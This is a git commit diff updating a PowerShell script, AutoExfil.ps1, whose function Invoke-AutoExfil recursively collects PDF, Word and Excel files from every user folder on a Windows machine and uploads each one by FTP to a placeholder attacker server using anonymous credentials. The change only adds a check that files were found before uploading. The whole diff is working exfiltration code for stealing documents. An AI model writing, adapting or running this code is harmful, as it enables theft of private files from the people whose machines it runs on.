be86ee0adee35119ccaa6f8c09662498e7b541ad
yaboygmoney <goldstein.austin@gmail.com>
2020-09-03 08:00:00 -0500

    Update AutoExfil.ps1

--- AutoExfil.ps1
+++ AutoExfil.ps1
@@ -3,13 +3,16 @@ function Invoke-AutoExfil
     $steal = ".pdf", ".doc", ".docx", ".xls"
 
     $files = Get-ChildItem -Force -Recurse -Path C:\users\ -ErrorAction SilentlyContinue | Where {$_.Extension -in $steal} | Select name,fullname
+    
+    if ($files.Length -ne 0) 
+    {
+    	$server = "ftp://SERVERIP/"
+    	$webclient = New-Object System.Net.WebClient
+    	$webclient.Credentials = New-Object System.Net.NetworkCredential("anonymous","anonymous")
 
-    $server = "ftp://SERVERIP/"
-    $webclient = New-Object System.Net.WebClient
-    $webclient.Credentials = New-Object System.Net.NetworkCredential("anonymous","anonymous")
-
-    foreach ($f in $files) {
+    	foreach ($f in $files) {
 	    $uri = New-Object System.Uri($server+$f.Name)
 	    $webclient.UploadFIle($uri, $f.Fullname)
-    }
+    	}
+   }
 }
